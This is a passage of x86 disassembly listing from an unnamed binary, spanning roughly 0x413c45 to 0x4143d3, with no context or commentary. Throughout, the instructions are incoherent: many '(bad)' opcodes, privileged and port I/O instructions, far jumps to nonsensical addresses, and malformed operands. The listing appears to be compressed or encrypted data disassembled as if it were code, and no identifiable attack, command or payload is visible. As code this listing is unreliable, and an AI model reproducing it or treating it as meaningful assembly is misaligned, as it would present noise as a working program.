  413c45:	adc    DWORD PTR [edx],0xffffffe7
  413c48:	push   eax
  413c49:	dec    esp
  413c4a:	test   edi,ebx
  413c4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c4d:	dec    ecx
  413c4e:	dec    esp
  413c4f:	cmp    eax,0x6d6a5e6
  413c54:	mov    bh,0x98
  413c56:	dec    eax
  413c57:	fs sub eax,0x48a234dc
  413c5d:	sbb    edx,ebp
  413c5f:	lea    esp,[esi]
  413c61:	pop    edx
  413c62:	dec    edx
  413c63:	xor    DWORD PTR [edx+0x4b],edx
  413c66:	or     BYTE PTR [edx-0x3054699b],0x51
  413c6d:	inc    ebx
  413c6e:	popf   
  413c6f:	fwait
  413c70:	mov    ebx,ebp
  413c72:	jo     0x413c8e
  413c74:	mov    esi,DWORD PTR [edi+0x7d80ff50]
  413c7a:	cli    
  413c7b:	pusha  
  413c7c:	or     bl,BYTE PTR [edx]
  413c7e:	mov    eax,DWORD PTR [edx+0x46]
  413c81:	or     edx,DWORD PTR [eax+0x3d]
  413c84:	push   ecx
  413c85:	dec    ecx
  413c86:	xlat   BYTE PTR ds:[ebx]
  413c87:	jnp    0x413c5d
  413c89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c8a:	or     ebp,DWORD PTR [esp+edx*1+0x6c888e93]
  413c91:	int3   
  413c92:	(bad)  
  413c94:	lds    edi,FWORD PTR [ebx]
  413c96:	cmc    
  413c97:	inc    esi
  413c98:	aam    0x8d
  413c9a:	pop    ds
  413c9b:	xor    BYTE PTR [esi],0x7a
  413c9e:	ins    DWORD PTR es:[edi],dx
  413c9f:	push   eax
  413ca0:	not    DWORD PTR [ecx]
  413ca2:	push   0x4f375e08
  413ca7:	pop    esi
  413ca8:	adc    al,0x79
  413caa:	ret    
  413cab:	iret   
  413cac:	sahf   
  413cad:	outs   dx,DWORD PTR ds:[esi]
  413cae:	shl    BYTE PTR [esi+0x7b],cl
  413cb1:	cli    
  413cb2:	icebp  
  413cb3:	mov    dh,0xb9
  413cb5:	pop    ebp
  413cb6:	ja     0x413ca3
  413cb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413cb9:	jmp    0x413c5b
  413cbb:	jle    0x413cc7
  413cbd:	and    eax,0x34a95f6f
  413cc2:	ds cmp eax,0xb0c2f3d1
  413cc8:	mov    ebp,0x1fe46a40
  413ccd:	inc    ecx
  413cce:	outs   dx,DWORD PTR ds:[esi]
  413ccf:	jmp    0x413d47
  413cd1:	pop    edi
  413cd2:	sbb    ah,0xe
  413cd5:	mov    cl,0xee
  413cd7:	xchg   esp,eax
  413cd8:	lahf   
  413cd9:	xchg   esi,eax
  413cda:	lods   al,BYTE PTR ds:[esi]
  413cdb:	inc    edi
  413cdc:	push   ebx
  413cdd:	jmp    0x3d0620a9
  413ce2:	jno    0x413cac
  413ce4:	fisub  WORD PTR [edx]
  413ce6:	or     al,0x31
  413ce8:	js     0x413c92
  413cea:	ror    BYTE PTR [edi],1
  413cec:	add    al,0xff
  413cee:	pop    ds
  413cef:	jo     0x413c7c
  413cf1:	or     edi,0x874cba29
  413cf7:	pop    es
  413cf8:	push   0x363ed250
  413cfd:	sbb    al,0x27
  413cff:	(bad)  
  413d00:	call   0x1c27:0xaa7a949c
  413d07:	inc    ecx
  413d08:	inc    esp
  413d09:	xlat   BYTE PTR ds:[ebx]
  413d0a:	or     eax,0x2e2a7673
  413d0f:	or     al,0xab
  413d11:	fdivr  QWORD PTR [eax-0x61]
  413d14:	js     0x413d2a
  413d16:	pop    es
  413d17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d18:	cmp    al,0xaf
  413d1a:	pusha  
  413d1b:	ins    BYTE PTR es:[edi],dx
  413d1c:	cwde   
  413d1d:	fist   DWORD PTR [eax+0x2d83e51b]
  413d23:	and    eax,0x748ad729
  413d28:	aam    0xbc
  413d2a:	leave  
  413d2b:	lods   eax,DWORD PTR ds:[esi]
  413d2c:	femms  
  413d2e:	fadd   DWORD PTR [edx]
  413d30:	std    
  413d31:	xchg   BYTE PTR [ebp-0x3883e372],dl
  413d37:	in     eax,dx
  413d38:	lock ins DWORD PTR es:[edi],dx
  413d3a:	retf   0xa4ec
  413d3d:	fnstsw WORD PTR [eax]
  413d3f:	cmp    bh,al
  413d41:	cmp    al,0x96
  413d43:	les    edx,FWORD PTR [edi-0x45b71f35]
  413d49:	into   
  413d4a:	clc    
  413d4b:	mov    BYTE PTR [ebx+0x7f],bl
  413d4e:	div    BYTE PTR [edx]
  413d50:	fs add ax,0x8e29
  413d55:	mov    ds:0x3ad12985,eax
  413d5a:	shr    DWORD PTR [edi-0x35],1
  413d5d:	ret    0x1b
  413d60:	lahf   
  413d61:	pop    eax
  413d62:	add    al,0x26
  413d64:	xchg   ebp,eax
  413d65:	mov    es,WORD PTR [eax-0x40]
  413d68:	jb     0x413ddb
  413d6a:	jp     0x413d2c
  413d6c:	add    al,0xac
  413d6e:	iret   
  413d6f:	inc    esp
  413d70:	mov    eax,ds:0xb62e97ca
  413d75:	inc    esi
  413d76:	jae    0x413db2
  413d78:	sub    al,0x2d
  413d7a:	pop    ebp
  413d7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d7c:	dec    ecx
  413d7d:	add    al,0xf8
  413d7f:	gs mov bl,0xbe
  413d82:	and    dh,BYTE PTR [esi]
  413d84:	add    eax,0xf0995f8f
  413d89:	pop    ecx
  413d8a:	cmp    eax,0x8a8f2b58
  413d8f:	or     al,0x5e
  413d91:	arpl   WORD PTR [edi+0x57],di
  413d94:	pusha  
  413d95:	ins    BYTE PTR es:[edi],dx
  413d96:	ja     0x413d6f
  413d98:	inc    ebp
  413d99:	jmp    0xb85a:0x3b355e0a
  413da0:	sbb    DWORD PTR [eax+0x2337595f],eax
  413da6:	dec    ecx
  413da7:	into   
  413da8:	leave  
  413da9:	mov    ebx,0xb1d3600b
  413dae:	int    0xd0
  413db0:	enter  0x46,0xd6
  413db4:	inc    edi
  413db5:	sub    ch,dh
  413db7:	stc    
  413db8:	mov    WORD PTR [ebx+0x695a1a95],ds
  413dbe:	call   0x8c1be0f7
  413dc3:	sti    
  413dc4:	lahf   
  413dc5:	add    bl,BYTE PTR [edx+ecx*1+0x15]
  413dc9:	or     ch,BYTE PTR [ebx]
  413dcb:	jmp    0x3b872fc5
  413dd0:	sub    bl,cl
  413dd2:	pop    esi
  413dd3:	xchg   BYTE PTR [edx-0xa27069c],dh
  413dd9:	mov    edx,0xe94b46de
  413dde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ddf:	cmc    
  413de0:	popa   
  413de1:	fistp  QWORD PTR [edx]
  413de3:	clc    
  413de4:	jge    0x413dcd
  413de6:	(bad)  
  413de7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413de8:	repz or BYTE PTR [ebp+0x141895c7],0x1a
  413df0:	iret   
  413df1:	lods   al,BYTE PTR ds:[esi]
  413df2:	dec    edi
  413df3:	xor    al,0x53
  413df5:	sub    dl,BYTE PTR [ebx]
  413df7:	pop    ds
  413df8:	data16 mov cl,0x37
  413dfb:	or     ebx,DWORD PTR [ebp-0x7732c5b3]
  413e01:	jp     0x413db0
  413e03:	and    ebp,DWORD PTR [eax]
  413e05:	fcmovnbe st,st(4)
  413e07:	aaa    
  413e08:	pop    ecx
  413e09:	std    
  413e0a:	fdivr  st,st(1)
  413e0c:	fidivr WORD PTR [ebp+0x8]
  413e0f:	pop    esp
  413e10:	xchg   cl,al
  413e12:	scas   eax,DWORD PTR es:[edi]
  413e13:	adc    al,0x89
  413e15:	xor    esi,ecx
  413e17:	jge    0x413e73
  413e19:	add    eax,0x6d775d13
  413e1e:	in     eax,dx
  413e1f:	xor    esp,ecx
  413e21:	inc    ebx
  413e22:	(bad)  
  413e23:	lock inc esp
  413e25:	sbb    BYTE PTR [edi+0x36b6076f],0xdd
  413e2c:	clc    
  413e2d:	inc    edx
  413e2e:	lods   eax,DWORD PTR ds:[esi]
  413e2f:	inc    ecx
  413e30:	inc    ecx
  413e31:	std    
  413e32:	jg     0x413de7
  413e34:	mov    al,ds:0x3440eb78
  413e39:	mov    ah,0x99
  413e3b:	jbe    0x413e92
  413e3d:	xchg   ebx,eax
  413e3e:	mov    edx,0x50150db0
  413e43:	addr16 stc 
  413e45:	jno    0x413e3a
  413e47:	dec    edi
  413e48:	daa    
  413e49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e4a:	push   ecx
  413e4b:	jge    0x413e13
  413e4d:	dec    edi
  413e4e:	in     eax,0x1d
  413e50:	mov    ah,0x4c
  413e52:	dec    edx
  413e53:	clc    
  413e54:	ror    DWORD PTR [eax+0xdc41d13],1
  413e5a:	xor    bl,0xc2
  413e5d:	mov    dl,0xa4
  413e5f:	jno    0x413e95
  413e61:	mov    eax,ds:0xe37c7d61
  413e66:	add    eax,0x2c6a776a
  413e6b:	pushf  
  413e6c:	test   al,0xa3
  413e6e:	adc    BYTE PTR gs:[esi+0x118f1392],0xfa
  413e76:	enter  0x3f90,0x8d
  413e7a:	sti    
  413e7b:	sahf   
  413e7c:	dec    ebx
  413e7d:	icebp  
  413e7e:	mov    edi,0x541dd75
  413e83:	clc    
  413e84:	nop
  413e85:	lods   al,BYTE PTR ds:[esi]
  413e86:	loopne 0x413e75
  413e88:	dec    edx
  413e89:	add    ch,BYTE PTR es:[esi+ecx*8]
  413e8d:	inc    eax
  413e8e:	mov    ah,0x4e
  413e90:	pop    ecx
  413e91:	and    dl,BYTE PTR [ecx+0x6e2dfd96]
  413e97:	fwait
  413e98:	in     eax,dx
  413e99:	lods   eax,DWORD PTR ds:[esi]
  413e9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e9b:	push   edi
  413e9c:	mov    ah,0xc3
  413e9e:	xchg   ebx,eax
  413e9f:	rol    BYTE PTR gs:[eax-0x315a6e28],cl
  413ea6:	test   al,0x2e
  413ea8:	or     al,BYTE PTR [edx+edx*1-0x5510188]
  413eaf:	sub    al,0x30
  413eb1:	repnz retf 
  413eb3:	mov    al,0xba
  413eb5:	scas   al,BYTE PTR es:[edi]
  413eb6:	sub    eax,0x1fa4664
  413ebb:	fcomp  DWORD PTR [ebp-0x6175603]
  413ec1:	ins    BYTE PTR es:[edi],dx
  413ec2:	in     al,dx
  413ec3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ec4:	sar    BYTE PTR [ebp-0x7965547b],cl
  413eca:	xor    al,0xbc
  413ecc:	push   cs
  413ecd:	int3   
  413ece:	icebp  
  413ecf:	fidivr WORD PTR [esi-0x7047e5c8]
  413ed5:	shr    DWORD PTR [ebp-0x33],0x7a
  413ed9:	retf   0x6b7b
  413edc:	cmp    eax,0xa910c07
  413ee1:	xchg   esi,eax
  413ee2:	xchg   ecx,ebx
  413ee4:	js     0x413e9d
  413ee6:	int3   
  413ee7:	js     0x413e80
  413ee9:	push   ds
  413eea:	aaa    
  413eeb:	mov    ds:0x8e13a505,al
  413ef0:	sub    edx,0x17
  413ef3:	push   ss
  413ef4:	ss lahf 
  413ef6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ef7:	sbb    bh,BYTE PTR [edx-0x68]
  413efa:	(bad)  
  413efb:	mov    ebx,0xac0c4d6e
  413f00:	int3   
  413f01:	mov    ah,0x7d
  413f03:	ficomp DWORD PTR [eax]
  413f05:	mov    dh,0xb0
  413f07:	sub    dh,ah
  413f09:	xor    ebp,0x3f26cf59
  413f0f:	sbb    eax,0x365bf7bb
  413f14:	ds stos BYTE PTR es:[edi],al
  413f16:	fild   QWORD PTR [edx-0x55b7fa39]
  413f1c:	(bad)  
  413f1d:	imul   esi,eax,0x3d28f244
  413f23:	sub    edx,ebx
  413f25:	sti    
  413f26:	sub    ch,bh
  413f28:	shufps xmm7,XMMWORD PTR [edi],0x3e
  413f2c:	repz inc esp
  413f2e:	lods   al,BYTE PTR ds:[esi]
  413f2f:	mov    dh,0xb4
  413f31:	add    ah,al
  413f33:	xchg   ebx,eax
  413f34:	xchg   edx,eax
  413f35:	mov    ah,0x30
  413f37:	daa    
  413f38:	(bad)  
  413f39:	and    edx,DWORD PTR [eax+0x44]
  413f3c:	fwait
  413f3d:	and    bl,BYTE PTR cs:[ebp+0x6196b15b]
  413f44:	push   ds
  413f45:	ja     0x413f47
  413f47:	add    eax,0x56869a92
  413f4c:	sub    eax,0x7e0c1b8d
  413f51:	pop    ss
  413f52:	xor    eax,0x4237d1a4
  413f57:	int    0xd7
  413f59:	push   ebx
  413f5a:	ret    
  413f5b:	je     0x413f13
  413f5d:	cli    
  413f5e:	nop
  413f5f:	call   0x50a8d650
  413f64:	mov    al,ds:0xea0ea190
  413f69:	sbb    DWORD PTR [edi],edx
  413f6b:	push   ebx
  413f6c:	mov    ds:0xc8c36d5a,eax
  413f71:	nop
  413f72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f73:	das    
  413f74:	pop    edi
  413f75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f76:	jbe    0x413f83
  413f78:	ret    0x991f
  413f7b:	fld    DWORD PTR [eax]
  413f7d:	loopne 0x413f59
  413f7f:	lds    ebx,FWORD PTR [ebp+0x76c1e623]
  413f85:	push   edi
  413f86:	test   al,0x53
  413f88:	test   eax,0x919c550
  413f8d:	push   edx
  413f8e:	sbb    DWORD PTR [edx-0x3d],esi
  413f91:	ins    DWORD PTR es:[edi],dx
  413f92:	lods   eax,DWORD PTR ds:[esi]
  413f93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f94:	mov    al,0x77
  413f96:	stos   DWORD PTR es:[edi],eax
  413f97:	push   edx
  413f98:	cli    
  413f99:	xchg   esi,eax
  413f9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f9b:	data16 and cl,dl
  413f9e:	lea    esp,[ecx+ebp*2]
  413fa1:	lea    eax,[ecx-0x522c965a]
  413fa7:	push   ss
  413fa8:	mov    bh,0x40
  413faa:	xchg   ecx,eax
  413fab:	aas    
  413fac:	sub    cl,BYTE PTR [eax+0x6ab6384c]
  413fb2:	dec    edx
  413fb3:	mov    edi,0x2a5bce21
  413fb8:	push   ebp
  413fb9:	scas   al,BYTE PTR es:[edi]
  413fba:	shl    BYTE PTR gs:[ecx+0x55],cl
  413fbe:	push   0x1d
  413fc0:	and    ebp,DWORD PTR [ebp-0x19]
  413fc3:	in     eax,dx
  413fc4:	adc    al,0xb0
  413fc6:	cmp    eax,0x32efcfc3
  413fcb:	mov    cl,0xa8
  413fcd:	mov    edx,DWORD PTR [esi+0x34]
  413fd0:	jo     0x413f7f
  413fd2:	xchg   esi,eax
  413fd3:	mov    ds:0x7d11101a,al
  413fd8:	and    eax,0xdf2b1231
  413fdd:	enter  0x754d,0xc8
  413fe1:	mov    dh,0xf
  413fe3:	idiv   DWORD PTR ds:[ecx-0x28b5c149]
  413fea:	pop    esi
  413feb:	test   al,0x34
  413fed:	aas    
  413fee:	mov    edx,edi
  413ff0:	and    eax,0xd7728318
  413ff5:	mov    WORD PTR [ebx],?
  413ff7:	push   edi
  413ff8:	(bad)
  413ffb:	mul    edi
  413ffd:	inc    BYTE PTR [esi-0x32]
  414000:	rcr    DWORD PTR [ebp+0x3c],1
  414003:	test   eax,0xce104c57
  414008:	xchg   esi,eax
  414009:	add    al,0xac
  41400b:	fist   WORD PTR [eax+0x2a5e6194]
  414011:	cwde   
  414012:	pop    esp
  414013:	ror    DWORD PTR [ebx-0x4d6a7196],1
  414019:	idiv   dl
  41401b:	(bad)  
  41401c:	int3   
  41401d:	adc    DWORD PTR [esi],eax
  41401f:	adc    eax,0x6e66b955
  414024:	js     0x413fe8
  414026:	test   BYTE PTR [ecx-0x4a95412a],0xdc
  41402d:	jo     0x414052
  41402f:	and    ebx,DWORD PTR [ebp+eax*8-0xa16f20d]
  414036:	ret    0xae1a
  414039:	fidiv  DWORD PTR [edx]
  41403b:	in     al,dx
  41403c:	mov    ecx,fs
  41403e:	and    eax,0x910cb1da
  414043:	sbb    al,0x50
  414045:	add    BYTE PTR [eax-0x60],bh
  414048:	scas   eax,DWORD PTR es:[edi]
  414049:	fs aas 
  41404b:	jecxz  0x414056
  41404d:	mov    ebx,0x83d74571
  414052:	daa    
  414053:	in     eax,0x8f
  414055:	pop    ecx
  414056:	scas   eax,DWORD PTR es:[edi]
  414057:	xchg   ecx,eax
  414058:	(bad)  
  414059:	and    ch,bh
  41405b:	int3   
  41405c:	dec    ebp
  41405d:	lods   al,BYTE PTR ds:[esi]
  41405e:	push   edi
  414060:	or     al,0x76
  414062:	jecxz  0x4140c2
  414064:	gs xor ch,bh
  414067:	in     al,0x80
  414069:	aam    0xd5
  41406b:	pop    eax
  41406c:	fistp  WORD PTR [ebp-0x45c4cb7]
  414072:	inc    ebx
  414073:	cwde   
  414074:	jmp    0x4140e6
  414076:	xchg   ebx,eax
  414077:	fdiv   QWORD PTR [eax]
  414079:	das    
  41407a:	xchg   BYTE PTR [ebx],ah
  41407c:	cmp    bl,bl
  41407e:	sub    al,0xd8
  414080:	loopne 0x4140d5
  414082:	daa    
  414083:	test   eax,0xf594885e
  414088:	mov    edx,0x92228d9d
  41408d:	adc    DWORD PTR ds:0x69298203,edi
  414093:	pop    ebp
  414094:	and    eax,0x6b0d2163
  414099:	xor    bh,BYTE PTR [edx+eiz*1]
  41409c:	dec    ebp
  41409d:	push   0x325dd87a
  4140a2:	in     eax,0xbc
  4140a4:	push   esi
  4140a5:	inc    esp
  4140a6:	mov    dh,0x88
  4140a8:	xchg   bh,dl
  4140aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140ab:	popa   
  4140ac:	stc    
  4140ad:	xchg   esp,eax
  4140ae:	xchg   esp,eax
  4140af:	lods   al,BYTE PTR ds:[esi]
  4140b0:	pop    ecx
  4140b1:	out    0xaa,eax
  4140b3:	push   eax
  4140b4:	lahf   
  4140b5:	aaa    
  4140b6:	in     eax,dx
  4140b7:	lea    edx,[edx]
  4140b9:	(bad)  [edi-0x39]
  4140bc:	sub    eax,0xb51bd53f
  4140c1:	imul   ebx,DWORD PTR [edi-0x78],0xa33233ce
  4140c8:	outs   dx,BYTE PTR ds:[esi]
  4140c9:	fidivr WORD PTR [esi]
  4140cb:	in     al,dx
  4140cc:	xor    dh,cl
  4140ce:	sub    BYTE PTR [edx+0x35],bh
  4140d1:	hlt    
  4140d2:	dec    edi
  4140d3:	pop    edi
  4140d4:	nop
  4140d5:	cwde   
  4140d6:	or     al,0x28
  4140d8:	pop    ds
  4140d9:	inc    ebp
  4140da:	rcl    al,0xe2
  4140dd:	sahf   
  4140de:	mov    DWORD PTR [esi],ebx
  4140e0:	imul   esp,ebx,0x2d7c5b7e
  4140e6:	sbb    ebx,DWORD PTR [ebp+0x3d402349]
  4140ec:	test   DWORD PTR [ecx],esp
  4140ee:	test   BYTE PTR [edx+0xa],bl
  4140f1:	mov    ebp,0xa65c4e07
  4140f6:	iret   
  4140f7:	ja     0x414095
  4140f9:	cdq    
  4140fa:	pop    ebx
  4140fb:	repz sar BYTE PTR [esi+0x199e6885],1
  414102:	mov    cl,0xeb
  414104:	jb     0x41412a
  414106:	push   ecx
  414107:	into   
  414108:	retf   0x3c35
  41410b:	add    ebp,DWORD PTR [ebp+0x4f]
  41410e:	mov    esp,0xedee84fd
  414113:	fadd   DWORD PTR [edx]
  414115:	jbe    0x4140c2
  414117:	lods   al,BYTE PTR ds:[esi]
  414118:	sub    BYTE PTR [eax+0x59],al
  41411b:	xchg   BYTE PTR [edx],cl
  41411d:	and    al,0x85
  414120:	sbb    DWORD PTR [edx-0x7b],ecx
  414123:	push   edi
  414124:	mov    ?,WORD PTR [eax-0x4c]
  414127:	daa    
  414128:	or     BYTE PTR [edx-0x60940a9f],al
  41412e:	imul   esp,DWORD PTR [ecx+0x10],0x30
  414132:	rcl    BYTE PTR [edx],cl
  414134:	push   esi
  414135:	mov    eax,ds:0x1abb2151
  41413a:	and    al,0x27
  41413c:	aas    
  41413d:	fwait
  41413e:	popf   
  41413f:	mov    esi,0x131ca0f
  414144:	sub    BYTE PTR [edx+0x6a00b82e],bh
  41414a:	fimul  DWORD PTR [eax]
  41414c:	inc    ebx
  41414d:	add    edi,0x99319c93
  414153:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414154:	dec    DWORD PTR [edi-0x79724b9]
  41415a:	(bad)  
  41415b:	out    0x31,eax
  41415d:	sbb    BYTE PTR [edi-0x1be4c320],al
  414163:	lock or bh,BYTE PTR [edi]
  414166:	push   edx
  414167:	cwde   
  414168:	jno    0x414198
  41416a:	xor    ebp,DWORD PTR [esi+0x74]
  41416d:	out    0x4a,al
  41416f:	out    dx,eax
  414170:	add    DWORD PTR [edi+edx*2],ebp
  414173:	pop    ebx
  414174:	pop    ebx
  414175:	cmp    edx,DWORD PTR fs:[esi+0x4d]
  414179:	data16 jns 0x414105
  41417c:	arpl   WORD PTR [edx],ax
  41417e:	and    ch,BYTE PTR [esp+eax*8]
  414181:	mov    ebp,0x8374a179
  414186:	mov    ebp,0xe7746991
  41418b:	push   es
  41418c:	lahf   
  41418d:	jp     0x41419a
  41418f:	adc    eax,0x9896a25
  414194:	inc    ecx
  414195:	adc    bh,dl
  414197:	inc    edi
  414198:	xchg   edx,eax
  414199:	adc    DWORD PTR [ecx+0x5d],ebp
  41419c:	dec    cl
  41419e:	(bad)  
  41419f:	outs   dx,DWORD PTR ds:[esi]
  4141a0:	sub    DWORD PTR [edx],ecx
  4141a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141a3:	lock pop ds
  4141a5:	sub    DWORD PTR [edx+0x64],edx
  4141a8:	cmp    eax,0x946f7388
  4141ad:	aam    0x1
  4141af:	or     esi,DWORD PTR cs:[edi+eiz*8-0x4]
  4141b4:	jmp    0x414208
  4141b6:	js     0x41420d
  4141b8:	mov    eax,0x400cbf9e
  4141bd:	mov    DWORD PTR [ecx],edx
  4141bf:	mov    ?,WORD PTR [eax+0xb]
  4141c2:	int    0xd6
  4141c4:	mov    bh,0x84
  4141c6:	mov    ebx,0xcb9d6f34
  4141cb:	pop    ds
  4141cc:	add    DWORD PTR [esi+0x7d],ecx
  4141cf:	xor    eax,0xae7164b1
  4141d4:	and    al,BYTE PTR [esi]
  4141d6:	pop    edi
  4141d7:	sub    al,0xa2
  4141d9:	xor    BYTE PTR [ebx+0x6e7a70a2],al
  4141df:	and    DWORD PTR [edx+0x35dfded5],0xa896abe5
  4141e9:	dec    esi
  4141ea:	jno    0x414193
  4141ec:	mov    BYTE PTR [edx+ebp*8],0x5c
  4141f0:	mov    es,WORD PTR [edi+0x75]
  4141f3:	mov    DWORD PTR [ecx-0x74],ebp
  4141f6:	cmp    ah,BYTE PTR [esi+0x33]
  4141f9:	outs   dx,BYTE PTR ds:[esi]
  4141fa:	or     dh,BYTE PTR [esi-0x78cd4827]
  414200:	dec    esi
  414201:	(bad)  
  414202:	cli    
  414203:	push   es
  414204:	test   bl,al
  414206:	cmp    al,BYTE PTR [ebp-0x49]
  414209:	dec    edi
  41420a:	es (bad) 
  41420c:	dec    edx
  41420d:	sub    al,0xce
  41420f:	div    BYTE PTR ds:0x2b94bf32
  414215:	sub    eax,0x51ea14b8
  41421a:	test   esi,ecx
  41421c:	push   esp
  41421d:	popa   
  41421e:	mov    al,ds:0x8a859014
  414223:	lock pop esp
  414225:	mov    edx,0xbd6d213c
  41422a:	out    dx,eax
  41422b:	movq   QWORD PTR [ecx],mm2
  41422e:	mov    bh,0xb8
  414230:	cdq    
  414231:	scas   al,BYTE PTR es:[edi]
  414232:	les    eax,FWORD PTR [ebx-0x38]
  414235:	xchg   edi,eax
  414236:	mov    ebp,0x8b3a3d7e
  41423b:	dec    ebp
  41423c:	out    0xef,al
  41423e:	xor    cl,BYTE PTR [edx+0x3cbf924]
  414244:	aad    0xf4
  414246:	scas   eax,DWORD PTR es:[edi]
  414247:	push   ecx
  414248:	loop   0x41420f
  41424a:	rcr    bh,0xbe
  41424d:	fild   QWORD PTR [esi+0x51c122d2]
  414253:	cmp    BYTE PTR [eax-0x184b8dd1],cl
  414259:	mov    eax,0xd23b013
  41425e:	pop    edx
  41425f:	or     esp,DWORD PTR [esp+esi*1+0x76]
  414263:	iret   
  414264:	adc    ah,BYTE PTR [ebp-0x5a]
  414267:	pushw  ds
  414269:	pusha  
  41426a:	mov    bl,0x92
  41426c:	shl    DWORD PTR [ebx+0x43497a9f],cl
  414272:	test   eax,0xf73df664
  414277:	addr16 (bad) 
  41427a:	icebp  
  41427b:	jns    0x4142c8
  41427d:	clc    
  41427e:	and    DWORD PTR [esi+0x1d221978],edi
  414284:	icebp  
  414285:	xchg   ebx,ecx
  414287:	pusha  
  414288:	loope  0x4142ef
  41428a:	or     al,0xd
  41428c:	int    0x0
  41428e:	and    ah,BYTE PTR [eax]
  414290:	push   esi
  414291:	repz pop ebp
  414293:	dec    ebx
  414294:	(bad)  
  414295:	cld    
  414296:	xor    eax,DWORD PTR [edx+0x75]
  414299:	mov    edi,ebx
  41429b:	call   0xcd31:0x126ea2e1
  4142a2:	loope  0x41423a
  4142a4:	cwde   
  4142a5:	mov    eax,ds:0x875b87f
  4142aa:	int    0x5d
  4142ac:	and    ebx,DWORD PTR [edx-0xb87d63f]
  4142b2:	push   ebx
  4142b3:	mov    ds:0x3f841423,eax
  4142b8:	pop    eax
  4142b9:	aas    
  4142ba:	mov    bh,0x3b
  4142bc:	jmp    0xf14a2702
  4142c1:	sbb    esi,DWORD PTR [edi-0x1f]
  4142c4:	ds fucompp 
  4142c7:	and    bl,BYTE PTR [eax+0x4a]
  4142ca:	pop    ss
  4142cb:	add    al,0x1f
  4142cd:	push   edi
  4142ce:	arpl   ax,di
  4142d0:	pop    ebx
  4142d1:	jno    0x4142ee
  4142d3:	jmp    0x414316
  4142d5:	sub    edi,DWORD PTR [ecx+0x37]
  4142d8:	test   edi,eax
  4142da:	jne    0x4142f7
  4142dc:	jecxz  0x4142fe
  4142de:	add    edx,DWORD PTR [edx+eiz*4+0x46]
  4142e2:	stos   DWORD PTR es:[edi],eax
  4142e3:	inc    ebx
  4142e4:	hlt    
  4142e5:	jg     0x4142bc
  4142e7:	jle    0x414362
  4142e9:	ins    DWORD PTR es:[edi],dx
  4142ea:	dec    eax
  4142eb:	fldcw  WORD PTR [ecx]
  4142ed:	adc    edi,edx
  4142ef:	daa    
  4142f0:	xchg   edi,eax
  4142f1:	xlat   BYTE PTR ds:[ebx]
  4142f2:	mov    esi,0x8d353af6
  4142f7:	ror    DWORD PTR [ebx+0x50d65e8e],cl
  4142fd:	push   ecx
  4142fe:	add    eax,0x58487710
  414303:	ins    BYTE PTR es:[edi],dx
  414304:	sub    al,0x61
  414306:	push   es
  414307:	xor    DWORD PTR [ebx+0x463f53a6],ecx
  41430d:	mov    dh,0x57
  41430f:	push   edi
  414310:	lea    esp,[edi]
  414312:	lods   eax,DWORD PTR ds:[esi]
  414313:	test   eax,0x7eb61b88
  414318:	shr    DWORD PTR [eax-0x2a4e48ba],cl
  41431e:	push   0xffffff8f
  414320:	sbb    BYTE PTR [eax+0x7cfbee50],bh
  414326:	cmp    ebp,DWORD PTR [edx+0x26]
  414329:	nop
  41432a:	sbb    cl,dh
  41432c:	dec    esp
  41432d:	cmp    eax,0xa651d164
  414332:	jne    0x414321
  414334:	arpl   WORD PTR [ebp-0x6c],cx
  414337:	idiv   esi
  414339:	xlat   BYTE PTR ds:[ebx]
  41433a:	xor    BYTE PTR [edx+ebx*8],0x82
  41433e:	inc    ebp
  41433f:	fucomip st,st(7)
  414341:	ds pop ss
  414343:	and    dl,BYTE PTR [ecx-0x71]
  414346:	jecxz  0x414320
  414348:	ja     0x4143bc
  41434a:	repz mov dh,0x78
  41434d:	cwde   
  41434e:	popa   
  41434f:	push   edx
  414350:	pop    es
  414351:	mov    edi,DWORD PTR [ecx-0x4361894a]
  414357:	sub    dl,bl
  414359:	(bad)  
  41435b:	inc    eax
  41435c:	cmp    dh,BYTE PTR [eax-0xd977dcb]
  414362:	out    0x95,eax
  414364:	and    BYTE PTR [esi],0x8e
  414367:	xchg   edx,eax
  414368:	inc    eax
  414369:	pop    ds
  41436a:	(bad)
  41436d:	mov    ebx,0xdbe0296e
  414372:	cmp    eax,0xc353a6f1
  414377:	jo     0x4143b9
  414379:	inc    eax
  41437a:	jne    0x41432f
  41437c:	fist   DWORD PTR [ebx-0x27]
  41437f:	cmp    eax,0x8fa60476
  414384:	addr16 call 0x78ad7918
  41438a:	out    dx,al
  41438b:	pop    ebp
  41438c:	bound  ecx,QWORD PTR ss:[edi+eax*8]
  414390:	loop   0x4143a0
  414392:	inc    ebx
  414393:	sub    cl,BYTE PTR [ebx]
  414395:	or     eax,0xa87409be
  41439a:	xor    cl,BYTE PTR fs:[edx+ebp*4+0x79843569]
  4143a2:	mov    eax,ds:0x92ccd87b
  4143a7:	sti    
  4143a8:	push   ecx
  4143a9:	sub    DWORD PTR [esi+esi*4+0x24921821],edi
  4143b0:	push   ss
  4143b1:	aad    0xae
  4143b3:	cmp    ax,0xe016
  4143b7:	mov    WORD PTR [eax-0x629c3e50],gs
  4143bd:	jne    0x4143e6
  4143bf:	cmc    
  4143c0:	jns    0x41437c
  4143c2:	adc    ecx,ebx
  4143c4:	stc    
  4143c5:	imul   esi,DWORD PTR [eax-0x24],0x1d448915
  4143cc:	adc    dl,ch
  4143ce:	inc    ebx
  4143cf:	adc    DWORD PTR [ebx+0x37],edi
  4143d2:	stos   DWORD PTR es:[edi],eax
  4143d3:	(bad)  [ebp-0x5c]
